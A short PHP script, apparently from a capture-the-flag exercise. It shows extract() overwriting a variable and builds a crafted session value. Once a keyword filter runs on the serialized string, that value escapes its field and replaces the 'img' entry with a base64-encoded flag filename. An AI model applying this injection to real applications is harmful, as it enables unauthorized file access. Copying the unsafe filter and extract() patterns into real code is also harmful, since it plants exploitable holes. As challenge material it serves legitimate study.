
<?php

/* 假定 $var_array 是 wddx_deserialize 返回的数组*/

$size = "large";
$var_array = array("color" => "blue",
    "size"  => "medium",
    "shape" => "sphere");
extract($var_array);

echo "$color, $size, $shape\n";

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
$_SESSION['phpflag']=";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}";
$_SESSION['img'] = base64_encode('guest_img.png');
var_dump( serialize($_SESSION) );
var_dump(filter(serialize($_SESSION)));
var_dump(filter(serialize($_SESSION)));
?>

